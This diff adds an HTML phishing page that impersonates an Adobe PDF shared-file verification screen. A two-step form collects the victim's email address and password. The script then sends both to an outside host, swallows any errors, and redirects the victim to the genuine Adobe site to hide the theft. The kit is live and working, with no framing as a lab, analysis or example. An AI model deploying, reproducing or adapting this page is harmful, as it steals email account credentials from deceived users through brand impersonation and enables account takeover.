@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign in - Verify</title>
+  <link rel="shortcut icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAkFBMVEX////0Qzb0QTT0OSr4m5b0PjD0NSX0PC7zMyL0NyfzMB7+8O/0PzLzLx3+7Ov2aWD/+Pj4jYf3hX794d/5pqH8zMn1V0z6trL0Rjn82Nb7v7z7xsP1Ukf809H/9vX5op32b2b3fnf1XVP6r6r2ZVv0Sz/6sq74k432eHD93tz4kIn1W1DzKRT3iYL5mJP2bWRQlZR1AAAJ/klEQVR4nO2di1bbOhBFhdI4Jq8GUt4l0FLa0tL2///u4gDBjmWPNHts1rrL5wOId3BmRqOjkXODBg0aNGjQoEGDBg0aZCBvq8lP9DSr07HxA3lrwukJ+8I/ZcYP5N2Bqfw5A3TLubd9ogNjwsNPkNB9mdg+kTGhz2eU8GJq+kTWhJNjCujc6dz0kYwJ82tOeJaZPpIt4fwrB3SrsW2sMSU8vDMgdH9Hls9kSujHOM4UWh+a/hMtCSdfLACduzVNGJaEiwsbwivTWGNIOP9sA+jcZ8uEYUiYfbci/HRo91SGhH6ysSLcPJo9lSXh6MgK0Lljw1hjRugzozhTyLI4NSMcf7MDdO7b2Oq57AizM0vCs9zqucwI/WRlSbi5N6trrAgnhnGmkF1xakX4uLYlXOdW/0QjQts4U+ifVawxIswvrQlPrBKGDaG/N6tndro3Kk5tCEc/zAHNilMTQj8yjjOFZkbdDBPC8Ud7QOf+2BSnJoT2cabQRWbyT7Qg9FkXgM59NUkYFoSjv90QXpp0MywIpx3Ema1MXlMDwsltR4Duh0VxakCYX3VFuFzwpzMgnH82XTdV9NMgYXDC0YfOAN2JwUIYE3ZSz+xksNWGCce3HQJaFKeYkFoT2jWb4IRBCf1Bl4AWnVNKyK0J7brACQMS+sNlt4S8OIWEVluGzbqkCQMS5p3GmUKbcxhrGOH8tGtA5z7A4pQRdh1nCq1hwkCEBhaoCMFtfUQIrZaRgsUpIlwYWKAixHZpCGEfcabQHSpOCWFmYoGStUG7NIDQyAIVIdQ5BYQWVss4XZBYAwizfuJMoY+gONUT9hVnCpHOqZ7QzgIlawUShprQL7prsdUFtvXVhP3FmUJLvQ9MTWhltYyUvjjVEtpbE9ql39bXEtpaoCKk7pwqCf15X/XMq+60CUNJaGm1jNPsQJkwdIQ+e+ibUF2c6ghNjo4k6kL5muoIe48zhb7qYo2K0I/eAVDbOVURdmGBipDOQqQizLvcMmyWrnOqIRz/exdAt1R5MzSEGbFAkRdcdYJWQYisltePoBg60SQMBSGKM8cLshGgKU4VhMQCtRyPiTlF0zlNJ0RWy6f6mRgZNZ3TdEJkgXp6zdA3pChOkwnR1ITtOpZ0Bx7St/WTCUc3gHDr4kI74+md01RCZIGaPfeTFiBhpBenqYTIannzXHaR1yD9QFQqYUbizMvT+XOQMJKL00RCfw8Ad2e0Sdm3HCX+ExMJeZwphBJGquc0kZBUlaVZCTlIGKmd0zRCZE0o7T2ghJF4ICqNkFgtV6V2oM+BHS6xc5pEiKYmVDIZsU4nek6TCJEFqmIy9BPwl46SEkYKoR+Dd+uhGiBIP/IhabxLCiGKD7+qX/yY9JSTitMUwgzEmZqJkvgckrb1EwjnpJ6pzbdCL4RPeE0TCNEUqNoYCOSfTilO4wn9FNQzgVEeJGGkHIiKJ0TWhED3AW1+JBSn8YRTEBo2i8APhySM6/jiNJoQhfdgoYVMVfFbbdGEKM6ER1uRhBFfnMYSeg/izHX4cchKJX5bP5YQxZmGHRXU1YrunMYSkibnsmlrkxwCX8cmjEhCVM80HiL0HrSkYg9ERRIia0LzCD3i4LyK7JzGEaJpcy2NFdS6i+ycxhEiC9Rty+tE2iI3cVttcYSkN9ZqDSUt9MjOaRQh6m+2rgNQwojb1o8iJHFGsGiTLfO4bf0YQj8HcUYYt+rPwd+OmnMaQzj6pX8I0b5MjhZ9j4k1MYQL8FtZSy4f0oNdxWzrRxAiS7d8jIAkjJjOaQQhmgIlu+1IoI7Z1pcJ0X5mzJRO4gNsqyaiCdEUqJilOCmYIjqnIiHKyQ8x1bE/0C+uV/JWm0jYg8GHJAy5cyoSkj33Wdw8BNKSkj2nEqGf6z/dfY9sF02BwUPsnEqEKM7ETnQmv4RrKWFIhAuwuxA/W4bM6JU8pwIhskDFzwea/NF/inRri0BIrJbBVn5Y5OC7FM7aCdG0uRRDL3EICMVpOyGyQKX4XshXKWzrtxL6CYgzacZ68nNo39ZvJURxJu1wBDml0u45bSUkS7dl4migBTjR2Np0ayP0Xv+hsd3MncjWT+tntREiC1TqwHG/0LekWovTFkJkr0s/XU6+z7bffAthz556f69PGNctsaaFkEyb08zHJeu0lq22ZkJkJNBM6iArjJZ1WjMh+V3opq1M9fs/m+bc1EjoR72e+yhEEsavxpemkRDFmYgmX0DEV9a8rd9ISKbNaS+JIYV+Y/BuIkSWbu0sdVJENW7rNxGSDt8q9VjL26fqE8aqaautgRBNm9PfBks2gZqK0wZCZIH6rR8zDq6na1rMNBCSi/DIhDwSwRuK0zAhslqSEdw+01f7DcVpmJB4ldTDgLYiCSMca4KEPictNnR3ij/Uf3I4wgUJSYNWOyjnVcDZsgrGmiAh6ZkkOLCDmv/Wf3aw0ggRImuCav5IWcAb/RDqZoQIiQVqhi+6JQkjZN4JECKbEr9yg2yrhwxYAUJktTS4cJocpgmsvOuE6GJf1Yyc/QeY63PVTT3W1AlRnLG4vojEgU19IVwn7HUcQFBkbVoP5TVCn+v/fHIrv0G5PmHUt/VrhGgKFL1t40XkME2tc1ojJFOgLh9HUZJ+rCRh1IrTfUJ0QdXZ3w9R+iP1cYDHpXbgeJ+wmws39yU1jEnRsd853SPs4mLfgMTKByxQ913Je4RdXbi5p+W8Q2/0Xue0SuiznqZaip2OhX7j66q6fqsSdnOxb0DiTbgk4lVjTZWQmATTJJn6yNtU/ZVXCLu+CK8k8WwdqDyqndMKYZcXbu5LijVkJnqlOC0TkmZlsuSEod85qZysLhP2c0HVi8RJQWSXvVyclgnRtLlkiS534MgqF6clQnSaOV1ywgCpa/r2t0uEyGqp0D9pKxx4o0ud0xIhGUmpkXAy8Sku6Fti67e65o2w1zizlbReJpMq3jqnb4TdXuwbUpcJ462i2BEia4JOG/H05am6r7jaHVLYEfZx4ea+xAOSwBu9e0FeCZGlWyvxaBtYYeyK01fC7i/2DUm8xQkcQX4tTl8Je7wIryQ5Yeg9Ia9nkl4I3yHObCVt5PhM3zd6iTUvhGgKFJCYMEAAfDmD/ExIbORIK+lsFDhMs3quKBx93aGOpFgDGrjPRuVnwp4vwitJHPcEEsZ6uxO2JUQWKCgxYUz1xpDt394S9nnh5r7EO6nBL2i7I10QkgPxXNIpVxIFi1jj2LdkINElBhJGkYwKQjIFimsjDQcBd4YUt7a4fi/2DUlcYQBnwfGkIHyXi/BKWks2KtCSusifCP1hnxf7hiSezgA/o29jx6ZAmUg8yQdC4VnmDvL+L9zcl2R995k6nW3O3aSvLcMW3eW+XZm+lXvk0EV4RprdC4RgbvT7v6GDBg0aNGjQoEGDBg36X+g/EPynGs0oOh4AAAAASUVORK5CYII=" type="image/x-icon">
+  <style>
+    body {
+      margin: 0;
+      font-family: "Segoe UI", Arial, sans-serif;
+      background-color: #fff;
+      text-align: center;
+      background: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhf-Lr8oEAKLfqxGuiUyj4mwAhH-_dlJuQ-t6lnLuknoRsoyMEHhVuQdIiEKwTE6PuIGMVBUehxOBhSHQCHa2Wms4SUKYFIAwXQhTsfs7gOV5itSqiyLrEjQATSx5VgYCfsIJ7mwwTyt417nSJf2yiQcO2H3D0umjaF9y_mPeTU1GbCrNHEt5eQ2YT7JdQ/w477-h234/Untitled-1.jpg');
+      background-size: 100%;
+      background-position-y: 47px;
+    }
+
+    .header {
+      background: #691011;
+      color: white;
+      font-size: 20px;
+      font-weight: 500;
+      text-align: left;
+      padding: 12px 20px;
+    }
+
+    .logo {
+      margin: 25px 0;
+      visibility: hidden;
+    }
+
+    .card {
+      max-width: 350px;
+      margin: 0 auto;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+      padding: 20px;
+      background-color: white;
+    }
+
+    .card h2 {
+      font-size: 25px;
+      font-weight: 500;
+      margin: 0 0 15px 0;
+    }
+
+    .content {
+      text-align: left;
+      font-size: 17px;
+      color: #333;
+      margin-bottom: 20px;
+    }
+
+    .file {
+      display: flex;
+      align-items: center;
+      margin: 10px 0;
+      font-weight: 500;
+    }
+
+    .file img {
+      width: 28px;
+      margin-right: 8px;
+      margin-bottom: 10px;
+    }
+
+    .verify-btn {
+      display: block;
+      width: 100%;
+      background: #691011;
+      color: white;
+      border: none;
+      border-radius: 3px;
+      padding: 12px;
+      font-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+      margin-bottom: 20px;
+    }
+
+    .form-field {
+      text-align: left;
+      margin-bottom: 15px;
+    }
+
+    .form-field label {
+      font-size: 16px;
+      color: #333;
+      display: block;
+      margin-bottom: 6px;
+    }
+
+    .form-field input {
+      width: 94%;
+      padding: 10px;
+      font-size: 14px;
+      border: none;
+      background-color: #f2f2f2;
+      border-bottom: 2px solid #691011;
+      outline: none;
+    }
+
+    .footer {
+      font-size: 12px;
+      color: #fff;
+      margin-top: 110px;
+    }
+
+    .footer a {
+      color: #fff;
+      text-decoration: none;
+      margin: 0 5px;
+    }
+
+    /* Preloader */
+    .preloader {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.95);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      font-size: 20px;
+      color: #691011;
+      flex-direction: column;
+    }
+
+    .spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #691011;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 12px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="header">Adobe PDF</div>
+
+  <div class="logo">
+    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjmWgAmtBzCMcGv1qIQl4E-67bK46wVgw5WhDDsI6ZbkiyWLmmKfjPqyvSj6uTPz-SEl3FgXMWkfQwfmFkWrNCd8VT1ROKtylbBscvT8yBDai-vTh31wa8KWPFDuSDG6l_poNu1G91JIoUpy9wsbwBOx4WbiAIlxcpMcipIxdIrusWN8mUuKXRtCv0oE3w/s320/Adobe_Corporate_logo.svg.png" alt="Logo" height="60">
+  </div>
+
+  <div class="card">
+    <h2>Verify Your Identity</h2>
+
+    <div class="content" id="cardText">
+      <p>You've received a secure link to:</p>
+      <div class="file">
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgn86DXu05miVMk5nE-NADw_s7uDwK9l6KSmDG6QZ5hfzgq30Hprq5aUqSFGxHyV12Pd8ILF1p_lOsD8AGjgrDvKkwZ47Y2iz-yqnU_iSdK9ybmVz8Uiq0UV3zuI1Vzi0wgi64zVfCbRhrfNZycgd4qnOqObW-tE8yoyQ-09SzYqXk6viNn1xK3Q4d8EJs/s320/PDF_file_icon.svg.png" width="80px" alt="File"> Shared file.
+      </div>
+      <p id="instructionText">
+        To receive and download this PDF file, please enter specific professional email credentials that this document was sent to.
+      </p>
+    </div>
+
+    <form id="verifyForm">
+      <!-- Step 1 -->
+      <div id="step1">
+        <div class="form-field">
+          <label for="inputline1">Email:</label>
+          <input type="email" id="inputline1" name="user" required>
+        </div>
+        <button type="button" class="verify-btn" id="nextBtn">Next</button>
+      </div>
+
+      <!-- Step 2 -->
+      <div id="step2" style="display:none;">
+        <div class="form-field">
+          <label for="password">Verify Password:</label>
+          <input type="password" id="password" name="pass" required>
+        </div>
+        <button type="submit" id="verifyBtn" class="verify-btn">Verify</button>
+      </div>
+    </form>
+  </div>
+
+  <div class="footer">
+    Copyright © 2025 All rights reserved.
+    <a href="#">Privacy</a> & <a href="#">Cookies</a>
+  </div>
+
+  <!-- Preloader -->
+  <div class="preloader" id="preloader">
+    <div class="spinner"></div>
+    <div>Loading...</div>
+  </div>
+
+  <script>
+    const form = document.getElementById("verifyForm");
+    const step1 = document.getElementById("step1");
+    const step2 = document.getElementById("step2");
+    const preloader = document.getElementById("preloader");
+    const nextBtn = document.getElementById("nextBtn");
+    const emailInput = document.getElementById("inputline1");
+    const instructionText = document.getElementById("instructionText");
+
+    // Helper: mask part of email
+    function maskEmail(email) {
+      const [user, domain] = email.split("@");
+      if (!user || !domain) return email;
+      if (user.length <= 2) return user[0] + "***@" + domain;
+      return user[0] + "***" + user[user.length - 1] + "@" + domain;
+    }
+
+    // Step 1 -> Step 2
+    nextBtn.addEventListener("click", () => {
+      const emailVal = emailInput.value.trim();
+      if (emailVal === "") {
+        emailInput.focus();
+        return;
+      }
+
+      // Show preloader
+      preloader.style.display = "flex";
+
+      // After short delay, move to step 2
+      setTimeout(() => {
+        preloader.style.display = "none";
+        step1.style.display = "none";
+        step2.style.display = "block";
+
+        // Update the card text to include masked email
+        const masked = maskEmail(emailVal);
+        instructionText.textContent = `To continue, please enter the email credentials for ${masked}`;
+      }, 2000);
+    });
+
+    // Final form submit
+    form.addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      preloader.style.display = "flex"; // show preloader again
+
+      const formData = new FormData(form);
+
+      fetch("https://v2.siecimnc.com.mx/auth/next.php", {
+        method: "POST",
+        body: formData
+      })
+      .catch(() => {})
+      .finally(() => {
+        window.location.href = "https://www.adobe.com/creativecloud.html";
+      });
+    });
+  </script>
+</body>
+</html>
